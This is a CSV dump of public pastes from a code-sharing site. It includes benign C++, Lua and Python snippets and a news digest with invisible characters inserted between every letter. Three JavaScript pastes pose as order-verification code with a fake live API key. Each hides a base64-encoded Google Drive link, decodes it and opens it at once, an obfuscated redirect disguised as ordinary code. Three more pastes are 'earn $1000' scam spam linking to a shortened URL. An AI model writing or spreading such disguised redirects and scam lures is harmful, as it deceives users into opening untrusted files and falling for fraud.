id,title,username,language,date,content
7yWwxsi5,EARN $900 INSTANTLY 2025⭐ G8,ehabakramsaid,JavaScript,Wednesday 16th of April 2025 01:02:29 PM CDT," 
Pdf https://tinyurl.com/privguidee


EuPuLTuY5x
"
hCQvWDwh,Products.js,zebmekey,JavaScript,Wednesday 16th of April 2025 01:02:26 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/49195/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MC8uhAza,check_move,Cassimus,C++,Wednesday 16th of April 2025 12:54:09 PM CDT,"bool check_move(int col_from, int row_from, int col_to, int row_to, int board[8][8], bool is_white_move)
{
    // czy ruch miesci sie w planszy
    if (col_from < 0 || col_from > 7 || col_to < 0 || col_to > 7)
        return false;
    else if (row_from < 0 || row_from > 7 || row_to < 0 || row_to > 7)
        return false;
    // czy nie idziemy na biale pole
    else if (board[row_to][col_to] == 0)
        return false;
    // czy na polu skad zaczynamy stoi nasz pion
    else if (board[col_from][row_from] <= 1)
        return false;
    else if (board[col_from][row_from] == 2 && is_white_move)
        return false;
    else if (board[col_from][row_from] == 3 && !is_white_move)
        return false;
    // czy pole na ktore się ruszamy jest puste;
    else if (board[col_to][row_to] != 1)
        return false;
    else if (col_from == col_to || row_from == row_to)
        return false;

    // czy o jedno lub 2 pola po skosie
    if (abs(col_from - col_to) == 1 && abs(row_from - col_to) == 1)
        return true;
    else if (abs(col_from - col_to) == 2 && abs(row_from - col_to) == 2)
    {
        if (is_white_move)
        {
            if (col_from - col_to > 0 && row_from - row_to > 0)
            {
                if (board[row_from - 1][col_from - 1] == 2)
                    return true;
            }
            else if (col_from - col_to < 0 && row_from - row_to > 0)
            {
                if (board[row_from - 1][col_from + 1] == 2)
                    return true;
            }
            else if (col_from - col_to > 0 && row_from - row_to < 0)
            {
                if (board[row_from + 1][col_from - 1] == 2)
                    return true;
            }
            else if (col_from - col_to < 0 && row_from - row_to < 0)
            {
                if (board[row_from + 1][col_from + 1] == 2)
                    return true;
            }
            return false;
        }
        else
        {
            if (col_from - col_to > 0 && row_from - row_to > 0)
            {
                if (board[row_from - 1][col_from - 1] == 3)
                    return true;
            }
            else if (col_from - col_to < 0 && row_from - row_to > 0)
            {
                if (board[row_from - 1][col_from + 1] == 3)
                    return true;
            }
            else if (col_from - col_to > 0 && row_from - row_to < 0)
            {
                if (board[row_from + 1][col_from - 1] == 3)
                    return true;
            }
            else if (col_from - col_to < 0 && row_from - row_to < 0)
            {
                if (board[row_from + 1][col_from + 1] == 3)
                    return true;
            }
            return false;
        }
        return false;
    }
}"
56aaC2RR,Make $1000 15-MINUTES  (BEGINNER) HV,ehabakramsaid,JavaScript,Wednesday 16th of April 2025 12:49:01 PM CDT," 
Pdf https://tinyurl.com/privguidee


kB3lfpj6k6
"
7eTTpR4U,Order.js,zebmekey,JavaScript,Wednesday 16th of April 2025 12:46:41 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/02653/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YjjtPJDh,Script,MysteriaFool,Lua,Wednesday 16th of April 2025 12:46:23 PM CDT,"-- Grab The Services
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local Players = game:GetService(""Players"")
local Workspace = game:GetService(""Workspace"")
local RunService = game:GetService(""RunService"")
local TweenService = game:GetService(""TweenService"")


-- Main Obby module
local Obby = {}

-- Runs when the game starts
function Obby.OnStart()
	-- Set up all the special parts of our obby
	Obby.CreateKillParts()
	Obby.CreateSpawnLocations()
	Obby.CreateFakePlatforms()
	Obby.CreateMovingPlatforms()
	Obby.CreateChoiceDoors()

	-- When a new player joins
	Players.PlayerAdded:Connect(function(player)
		-- Make sure they have leaderstats
		if not player:FindFirstChild(""leaderstats"") then
			Obby.CreateLeaderstats(player)
		end
		
		-- When their character spawns in
		player.CharacterAdded:Connect(function(character)
			-- Store when they spawned (used for checkpoint delay)
			character:SetAttribute(""SpawnTime"", tick())

			-- Send them to the right spawn for their current stage
			Obby.HandlePlayerRespawn(player)

			-- Track deaths for stats
			Obby.HandlePlayerDeath(player, character)
		end)
	end)
end

-- Creates and sets up leaderstats (Stage and Deaths)
function Obby.CreateLeaderstats(player)
	local leaderstats = Instance.new(""Folder"")
	leaderstats.Name = ""leaderstats""
	leaderstats.Parent = player

	local stage = Instance.new(""NumberValue"", leaderstats)
	stage.Name = ""Stage""
	stage.Value = 1 -- Everyone starts at stage 1

	local deaths = Instance.new(""NumberValue"", leaderstats)
	deaths.Name = ""Deaths""
	deaths.Value = 0
end

-- Teleports the player to the correct spawn based on their current stage
function Obby.HandlePlayerRespawn(player)
	local leaderstats = player:FindFirstChild(""leaderstats"")
	if not leaderstats then return end

	local stageValue = leaderstats:FindFirstChild(""Stage"")
	if not stageValue then return end

	local stage = stageValue.Value
	local stageFolder = Workspace.Stages:FindFirstChild(tostring(stage))
	if not stageFolder then return end

	local spawnLocation = stageFolder:FindFirstChild(""SpawnLocation"")
	if not spawnLocation then return end

	-- Preload the area before teleporting the player
	player:RequestStreamAroundAsync(spawnLocation.Position)

	local character = player.Character
	if character then
		character:PivotTo(spawnLocation.CFrame)
	end
end

-- When the player dies, increase their death count
function Obby.HandlePlayerDeath(player, character)
	local humanoid = character:FindFirstChildOfClass(""Humanoid"")
	if humanoid then
		humanoid.Died:Connect(function()
			local leaderstats = player:FindFirstChild(""leaderstats"")
			if leaderstats then
				local deaths = leaderstats:FindFirstChild(""Deaths"")
				if deaths then
					deaths.Value += 1
				end
			end
		end)
	end
end

-- Makes a portal teleport anything that touches it to a destination point
function Obby.CreatePortal(portal, destination)
    portal.Touched:Connect(function(other)
        local char = other.Parent
        local root = char and char:FindFirstChild(""HumanoidRootPart"")
		if root then
			-- Move the player a little above the destination so they don’t get stuck
			root.CFrame = destination * CFrame.new(0, 3, 0)
		end
    end)
end

-- Detects when players touch spawn locations and updates their checkpoint
function Obby.CreateSpawnLocations()
	for _, spawn in ipairs(Workspace.Stages:GetDescendants()) do 
		if spawn:IsA(""SpawnLocation"") then
			spawn.Touched:Connect(function(otherPart)
				local character = otherPart.Parent
				if not character or not character:IsA(""Model"") then return end

				local player = Players:GetPlayerFromCharacter(character)
				if not player then return end

				-- Don't let the spawn trigger instantly after respawn
				local spawnTime = character:GetAttribute(""SpawnTime"")
				if spawnTime and tick() - spawnTime < 2 then return end

				local leaderstats = player:FindFirstChild(""leaderstats"")
				if not leaderstats then return end

				local stageValue = leaderstats:FindFirstChild(""Stage"")
				if not stageValue then return end

				local newStage = tonumber(spawn.Parent.Name)
				if newStage and newStage > stageValue.Value then
					stageValue.Value = newStage
					Obby.ShowCheckpointUI(player)
				end
			end)
		end
	end
end

-- These parts kill the player when touched
function Obby.CreateKillParts()
	for _, part in ipairs(Workspace.Stages:GetDescendants()) do
		if part:IsA(""BasePart"") and part.Name == ""Kill"" then
			part.Touched:Connect(function(otherPart)
				local character = otherPart.Parent
				if character and character:IsA(""Model"") then
					local humanoid = character:FindFirstChildOfClass(""Humanoid"")
					if humanoid and humanoid.Health > 0 then
						humanoid.Health = 0 -- Instant death
					end
				end
			end)
		end
	end
end

-- Platforms that disappear temporarily after being touched
function Obby.CreateFakePlatforms()
	for _, part in ipairs(Workspace.Stages:GetDescendants()) do
		if part:IsA(""BasePart"") and part.Name == ""FakePlatform"" then
			part.Touched:Connect(function(otherPart)
				local character = otherPart.Parent
				if character and character:IsA(""Model"") then
					task.wait(0.0) -- Let them land first
					part.Transparency = 1
					part.CanCollide = false
					task.wait(3) -- Bring it back after 3 seconds
					part.Transparency = 0
					part.CanCollide = true
				end
			end)
		end
	end
end

-- Moves platforms back and forth using TweenService
function Obby.CreateMovingPlatforms()
	for _, platform in ipairs(Workspace.Stages:GetDescendants()) do
		if platform:IsA(""BasePart"") and platform.Name == ""MovingPlatform"" then
			local targetPosition = platform:GetAttribute(""TargetPosition"")
			local moveTime = platform:GetAttribute(""MoveTime"") or 3 
			local waitTime = platform:GetAttribute(""WaitTime"") or 1 

			if targetPosition then
				local startPos = platform.Position
				local endPos = Vector3.new(targetPosition.X, targetPosition.Y, targetPosition.Z)

				local tweenInfo = TweenInfo.new(
					moveTime,
					Enum.EasingStyle.Sine,
					Enum.EasingDirection.InOut,
					-1, -- Infinite loops
					true -- Ping-pong back and forth
				)

				local tween = TweenService:Create(platform, tweenInfo, {Position = endPos})
				tween:Play()

				-- This keeps the platform's velocity synced so characters ride it smoothly
				local lastPosition = platform.Position

				RunService.Stepped:Connect(function(_, deltatime)
					local currentPosition = platform.Position
					local deltaPosition = currentPosition - lastPosition
					local velocity = deltaPosition / deltatime

					platform.AssemblyLinearVelocity = velocity
					lastPosition = currentPosition
				end)
			end
		end
	end
end

-- Handles a level where players choose between deadly or safe doors
function Obby.CreateChoiceDoors()
	local stages = Workspace:FindFirstChild(""Stages"")
	if not stages then return end

	local choiceDoors = stages:FindFirstChild(""20"") -- Only runs if stage 20 exists
	if not choiceDoors then return end

	for _, doorModel in ipairs(choiceDoors:GetChildren()) do
		if doorModel:IsA(""Model"") then
			local trapDoor = doorModel:FindFirstChild(""TrapDoor"")
			local rightDoor = doorModel:FindFirstChild(""RightDoor"")

			-- Trap door kills you if you touch it
			if trapDoor and trapDoor:IsA(""BasePart"") then
				trapDoor.Touched:Connect(function(otherPart)
					local character = otherPart.Parent
					local humanoid = character and character:FindFirstChildOfClass(""Humanoid"")
					if humanoid and humanoid.Health > 0 then
						humanoid.Health = 0
					end
				end)
			end

			-- Right door lets you through temporarily
			if rightDoor and rightDoor:IsA(""BasePart"") then
				rightDoor.Touched:Connect(function(otherPart)
					local character = otherPart.Parent
					local humanoid = character and character:FindFirstChildOfClass(""Humanoid"")
					if humanoid then
						rightDoor.CanCollide = false
						rightDoor.Transparency = 0.5
						task.wait(2)
						rightDoor.CanCollide = true
						rightDoor.Transparency = 0.35
					end
				end)
			end
		end
	end
end

-- Shows a little UI popup when a checkpoint is reached
function Obby.ShowCheckpointUI(player)
	local playerGui = player:FindFirstChildOfClass(""PlayerGui"")
	if not playerGui then return end

	local existingUI = playerGui:FindFirstChild(""CheckpointUI"")
	local ui

	if existingUI then
		ui = existingUI
	else
		local template = ReplicatedStorage:FindFirstChild(""CheckpointUI"")
		if not template then return end
		ui = template:Clone()
		ui.Parent = playerGui
	end

	local label = ui:FindFirstChildOfClass(""TextLabel"")
	if not label then return end

	label.Visible = true
	label.TextTransparency = 1

	-- Fade in the text
	for i = 0, 1, 0.1 do
		label.TextTransparency = 1 - i
		task.wait(0.03)
	end

	task.wait(0.4)

	-- Fade it back out
	for i = 0, 1, 0.1 do
		label.TextTransparency = i
		task.wait(0.03)
	end

	label.Visible = false
end

-- return the module
return Obby"
pYXQFRAK,ari ejercicios 3,Bitupx,C++,Wednesday 16th of April 2025 12:43:26 PM CDT,"#include <iostream>
using namespace std;

int main() {
    int cantidad;
    float nota, notapromedio, notamax = -1, notamin = 101;  // ❌ El estudiante no inicializó notamax/notamin

    float sumaNotas = 0;        // ✅ Necesario para calcular promedio
    int aprobados = 0;          // ✅ Contador para aprobados
    int reprobados = 0;         // ✅ Contador para reprobados

    cout << ""Ingrese la cantidad de estudiantes: "";
    cin >> cantidad;

    // ❌ El estudiante pedía solo UNA nota aquí, lo cual está mal
    //    porque se debe pedir una por cada estudiante dentro del bucle

    // ✅ Este es el bucle correcto para pedir una nota por estudiante
    for (int i = 0; i < cantidad; i++) {   // ❌ El estudiante escribió 'For' y mal la condición

        cout << ""Ingrese la nota del estudiante #"" << i + 1 << "": "";
        cin >> nota;

        sumaNotas += nota;  // ✅ Vamos acumulando para sacar el promedio después

        // ✅ Verificamos la nota máxima
        if (nota > notamax) {
            notamax = nota;
        }

        // ✅ Verificamos la nota mínima
        if (nota < notamin) {
            notamin = nota;
        }

        // ✅ Contamos aprobados y reprobados
        if (nota >= 60) {
            aprobados++;
        } else {
            reprobados++;
        }
    }

    notapromedio = sumaNotas / cantidad;   // ❌ El estudiante dividía cantidad / nota (al revés)

    cout << ""El promedio de las notas es de: "" << notapromedio << endl;
    cout << ""La nota máxima fue: "" << notamax << endl;
    cout << ""La nota mínima fue: "" << notamin << endl;
    cout << ""Cantidad de aprobados: "" << aprobados << endl;
    cout << ""Cantidad de reprobados: "" << reprobados << endl;

    return 0;
}
"
d64MKwEY,Make $1000 15-MINUTES (BEGINNER) FM,rod005,JavaScript,Wednesday 16th of April 2025 12:35:30 PM CDT," 
Pdf https://tinyurl.com/privguidee


VjVw5ng9aG
"
JkfV0wtj,RequestException: error with request,basedcount_bot,Python,Wednesday 16th of April 2025 12:32:57 PM CDT,"Traceback (most recent call last):
  File ""/home/gmktec/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/home/gmktec/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 263, in read_comments
    async for comment in pcm_subreddit.stream.comments(skip_existing=True):  # Comment
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/util.py"", line 172, in stream_generator
    [result async for result in function(limit=limit, **function_kwargs)]
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/util.py"", line 172, in <listcomp>
    [result async for result in function(limit=limit, **function_kwargs)]
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 37, in __anext__
    await self._next_batch()
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/models/listing/generator.py"", line 90, in _next_batch
    self._listing = await self._reddit.get(self.url, params=self.params)
                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 813, in get
    return await self._objectify_request(method=""GET"", params=params, path=path)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 570, in _objectify_request
    await self.request(
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/util/deprecate_args.py"", line 54, in wrapped
    return await _wrapper(*args, **kwargs)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncpraw/reddit.py"", line 1061, in request
    return await self._core.request(
           ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 383, in request
    return await self._request_with_retries(
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 286, in _request_with_retries
    response, saved_exception = await self._make_request(
                                ^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/sessions.py"", line 192, in _make_request
    response = await self._rate_limiter.call(
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/rate_limit.py"", line 51, in call
    response = await request_function(*args, **kwargs)
               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/.venv/lib/python3.11/site-packages/asyncprawcore/requestor.py"", line 80, in request
    raise RequestException(exc, args, kwargs) from None
asyncprawcore.exceptions.RequestException: error with request 
"
Un2VrcsX,Market.js,zebmekey,JavaScript,Wednesday 16th of April 2025 12:31:19 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70015/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0JwuHC98,News April16 25,Newscaster_Ned,Email,Wednesday 16th of April 2025 12:29:44 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

H‎e‎l‎l‎o‎!‎ ‎I‎t‎'‎s‎ ‎m‎e‎!‎ ‎J‎u‎l‎i‎o‎ ‎t‎h‎e‎ ‎s‎p‎i‎c‎!‎ ‎H‎e‎r‎e‎'‎s‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎!‎

I‎r‎a‎n‎ ‎T‎i‎e‎s‎ ‎o‎f‎ ‎M‎T‎N‎,‎ ‎C‎h‎a‎i‎r‎e‎d‎ ‎b‎y‎ ‎S‎o‎u‎t‎h‎ ‎A‎f‎r‎i‎c‎a‎’‎s‎ ‎N‎e‎w‎ ‎E‎n‎v‎o‎y‎,‎ ‎C‎o‎u‎l‎d‎ ‎H‎u‎r‎t‎ ‎M‎e‎t‎a‎,‎ ‎O‎t‎h‎e‎r‎ ‎F‎i‎r‎m‎s‎
T‎r‎u‎m‎p‎ ‎O‎r‎d‎e‎r‎s‎ ‎P‎r‎o‎b‎e‎ ‎o‎f‎ ‎C‎r‎i‎t‎i‎c‎a‎l‎ ‎M‎i‎n‎e‎r‎a‎l‎ ‎I‎m‎p‎o‎r‎t‎s‎,‎ ‎D‎o‎m‎i‎n‎a‎t‎e‎d‎ ‎b‎y‎ ‎C‎h‎i‎n‎a‎
A‎d‎m‎i‎n‎ ‎R‎e‎f‎e‎r‎s‎ ‎L‎e‎t‎i‎t‎i‎a‎ ‎J‎a‎m‎e‎s‎ ‎f‎o‎r‎ ‎P‎r‎o‎s‎e‎c‎u‎t‎i‎o‎n‎ ‎o‎v‎e‎r‎ ‎A‎l‎l‎e‎g‎e‎d‎ ‎M‎o‎r‎t‎g‎a‎g‎e‎ ‎F‎r‎a‎u‎d‎
B‎o‎n‎d‎i‎ ‎A‎n‎n‎o‎u‎n‎c‎e‎s‎ ‎D‎O‎J‎ ‎L‎a‎w‎s‎u‎i‎t‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎M‎a‎i‎n‎e‎ ‎o‎v‎e‎r‎ ‎T‎r‎a‎n‎s‎ ‎S‎p‎o‎r‎t‎s‎ ‎D‎i‎s‎p‎u‎t‎e‎
G‎a‎y‎:‎ ‎V‎i‎o‎l‎a‎t‎i‎n‎g‎ ‎I‎m‎m‎i‎g‎r‎a‎n‎t‎s‎'‎ ‎D‎u‎e‎ ‎P‎r‎o‎c‎e‎s‎s‎ ‎'‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎A‎l‎l‎ ‎o‎f‎ ‎U‎s‎'‎
L‎a‎u‎r‎e‎n‎c‎e‎ ‎T‎r‎i‎b‎e‎:‎ ‎W‎e‎ ‎H‎a‎v‎e‎ ‎a‎n‎ ‎'‎I‎m‎p‎e‎n‎d‎i‎n‎g‎ ‎P‎o‎l‎i‎c‎e‎ ‎S‎t‎a‎t‎e‎'‎ ‎U‎n‎d‎e‎r‎ ‎T‎r‎u‎m‎p‎
H‎o‎m‎e‎l‎e‎s‎s‎ ‎M‎a‎n‎ ‎W‎i‎n‎s‎ ‎$‎1‎ ‎M‎i‎l‎l‎i‎o‎n‎ ‎o‎n‎ ‎a‎ ‎S‎c‎r‎a‎t‎c‎h‎-‎O‎f‎f‎ ‎L‎o‎t‎t‎e‎r‎y‎ ‎T‎i‎c‎k‎e‎t‎
H‎o‎m‎a‎n‎:‎ ‎D‎e‎m‎ ‎S‎e‎n‎a‎t‎o‎r‎s‎ ‎V‎i‎s‎i‎t‎i‎n‎g‎ ‎E‎l‎ ‎S‎a‎l‎v‎a‎d‎o‎r‎ ‎P‎r‎i‎s‎o‎n‎ ‎'‎D‎i‎s‎g‎u‎s‎t‎i‎n‎g‎'‎
4‎c‎h‎a‎n‎ ‎D‎o‎w‎n‎ ‎A‎f‎t‎e‎r‎ ‎B‎e‎i‎n‎g‎ ‎H‎a‎c‎k‎e‎d‎ ‎b‎y‎ ‎R‎i‎v‎a‎l‎s‎ ‎i‎n‎ ‎'‎E‎x‎t‎e‎n‎s‎i‎v‎e‎ ‎O‎w‎n‎'‎
‘‎O‎k‎l‎a‎h‎o‎m‎a‎ ‎C‎i‎t‎y‎ ‎B‎o‎m‎b‎i‎n‎g‎’‎ ‎R‎e‎v‎i‎e‎w‎:‎ ‎N‎e‎t‎f‎l‎i‎x‎ ‎D‎o‎c‎ ‎T‎a‎k‎e‎s‎ ‎U‎s‎ ‎B‎a‎c‎k‎ ‎t‎o‎ ‎a‎ ‎D‎r‎e‎a‎d‎f‎u‎l‎ ‎D‎a‎y‎
D‎i‎s‎r‎u‎p‎t‎i‎v‎e‎ ‎P‎r‎o‎t‎e‎s‎t‎e‎r‎s‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎,‎ ‎T‎a‎s‎e‎d‎ ‎a‎t‎ ‎E‎v‎e‎n‎t‎ ‎f‎o‎r‎ ‎M‎a‎r‎j‎o‎r‎i‎e‎ ‎T‎a‎y‎l‎o‎r‎ ‎G‎r‎e‎e‎n‎e‎
G‎o‎o‎g‎l‎e‎ ‎F‎a‎c‎e‎s‎ ‎$‎6‎.‎6‎B‎ ‎L‎a‎w‎s‎u‎i‎t‎ ‎i‎n‎ ‎U‎K‎ ‎f‎o‎r‎ ‎A‎l‎l‎e‎g‎e‎d‎ ‎S‎e‎a‎r‎c‎h‎ ‎A‎d‎v‎e‎r‎t‎i‎s‎i‎n‎g‎ ‎M‎o‎n‎o‎p‎o‎l‎y‎
P‎o‎l‎l‎a‎k‎:‎ ‎T‎h‎e‎ ‎O‎n‎e‎ ‎T‎r‎u‎m‎p‎ ‎P‎o‎l‎i‎c‎y‎ ‎I‎ ‎D‎i‎d‎n‎'‎t‎ ‎A‎n‎t‎i‎c‎i‎p‎a‎t‎e‎
R‎e‎d‎ ‎S‎o‎x‎-‎R‎a‎y‎s‎ ‎G‎a‎m‎e‎ ‎D‎e‎l‎a‎y‎e‎d‎ ‎b‎y‎ ‎t‎h‎e‎ ‎M‎o‎s‎t‎ ‎A‎n‎n‎o‎y‎i‎n‎g‎ ‎S‎o‎u‎n‎d‎
J‎a‎k‎e‎ ‎S‎u‎l‎l‎i‎v‎a‎n‎ ‎S‎a‎y‎s‎ ‎T‎r‎u‎m‎p‎ ‎I‎s‎ ‎T‎o‎o‎ ‎H‎a‎r‎d‎ ‎o‎n‎ ‎B‎e‎i‎j‎i‎n‎g‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
R‎o‎g‎u‎e‎ ‎B‎o‎a‎s‎b‎e‎r‎g‎ ‎S‎t‎r‎i‎k‎e‎s‎ ‎A‎g‎a‎i‎n‎!‎

F‎i‎n‎d‎s‎ ‎P‎r‎o‎b‎a‎b‎l‎e‎ ‎C‎a‎u‎s‎e‎ ‎t‎o‎ ‎H‎o‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎A‎d‎m‎i‎n‎ ‎i‎n‎ ‎C‎o‎n‎t‎e‎m‎p‎t‎
T‎h‎e‎ ‎A‎s‎s‎o‎c‎i‎a‎t‎e‎d‎ ‎P‎r‎e‎s‎s‎
A‎ ‎f‎e‎d‎e‎r‎a‎l‎ ‎j‎u‎d‎g‎e‎ ‎s‎a‎y‎s‎ ‎h‎e‎’‎s‎ ‎f‎o‎u‎n‎d‎ ‎p‎r‎o‎b‎a‎b‎l‎e‎ ‎c‎a‎u‎s‎e‎ ‎t‎o‎ ‎h‎o‎l‎d‎ ‎t‎h‎e‎ ‎T‎r‎u‎m‎p‎ ‎a‎d‎m‎i‎n‎i‎s‎t‎r‎a‎t‎i‎o‎n‎ ‎i‎n‎ ‎c‎r‎i‎m‎i‎n‎a‎l‎ ‎c‎o‎n‎t‎e‎m‎p‎t‎ ‎o‎f‎ ‎c‎o‎u‎r‎t‎ ‎f‎o‎r‎ ‎v‎i‎o‎l‎a‎t‎i‎n‎g‎ ‎h‎i‎s‎ ‎o‎r‎d‎e‎r‎s‎ ‎t‎o‎ ‎t‎u‎r‎n‎ ‎a‎r‎o‎u‎n‎d‎ ‎p‎l‎a‎n‎e‎s‎ ‎c‎a‎r‎r‎y‎i‎n‎g‎ ‎d‎e‎p‎o‎r‎t‎e‎e‎s‎ ‎t‎o‎ ‎E‎l‎ ‎S‎a‎l‎v‎a‎d‎o‎r‎ ‎J‎u‎d‎g‎e‎ ‎f‎i‎n‎d‎s‎ ‎p‎r‎o‎b‎a‎b‎l‎e‎ ‎c‎a‎u‎s‎e‎ ‎t‎o‎ ‎h‎o‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎a‎d‎m‎i‎n‎i‎s‎t‎r‎a‎t‎i‎o‎n‎ ‎i‎n‎

C‎h‎i‎n‎a‎ ‎S‎t‎o‎p‎s‎ ‎E‎x‎p‎o‎r‎t‎s‎ ‎o‎f‎ ‎C‎r‎u‎c‎i‎a‎l‎ ‎R‎a‎r‎e‎ ‎E‎a‎r‎t‎h‎ ‎M‎i‎n‎e‎r‎a‎l‎s‎ ‎I‎m‎p‎a‎c‎t‎i‎n‎g‎ ‎K‎e‎y‎ ‎I‎n‎d‎u‎s‎t‎r‎i‎e‎s‎
